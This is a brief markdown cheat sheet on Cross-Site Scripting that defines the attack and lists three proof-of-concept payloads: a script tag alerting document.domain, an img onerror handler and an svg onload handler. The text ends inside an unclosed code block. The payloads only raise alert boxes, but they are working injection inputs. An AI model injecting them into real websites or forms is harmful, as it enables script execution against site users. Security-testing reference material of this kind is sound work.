# Cross-Site Scripting (XSS)

## Description
Cross-Site Scripting (XSS) occurs when malicious scripts are injected into otherwise benign and trusted websites.

## Practical Payloads
```html
<!-- Basic Alert Proof of Concept -->
<script>alert(document.domain)</script>

<!-- HTML Injection Source Bypass -->
<img src=x onerror=alert(1)>

<!-- SVG Vector -->
<svg onload=alert(1)>
